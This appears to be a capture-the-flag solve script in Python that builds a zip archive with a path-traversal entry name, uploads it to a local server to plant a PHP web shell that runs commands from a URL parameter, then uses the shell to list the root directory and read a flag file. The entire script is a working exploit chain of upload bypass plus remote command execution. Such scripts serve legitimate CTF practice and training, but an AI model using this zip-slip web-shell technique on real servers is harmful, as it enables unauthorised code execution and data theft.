import requests, zipfile, io, re

buf = io.BytesIO()

with zipfile.ZipFile(buf, 'w', compression=zipfile.ZIP_DEFLATED) as zf:
    zf.writestr('..././..././solve.php', '<?php system($_GET["cmd"]); ?>')

buf.seek(0)

url = 'http://localhost:5000'
file = { "file": ('solve.zip', buf, "application/zip")}

requests.post(url, files=file)

r = requests.get(url + '/solve.php?cmd=ls+/')
flag_path = re.search(r'.{8}_flag.txt', r.text)
r = requests.get(url + f'/solve.php?cmd=cat+/{flag_path.group()}')
print(re.search(r'SSS\{.+?\}', r.text).group())
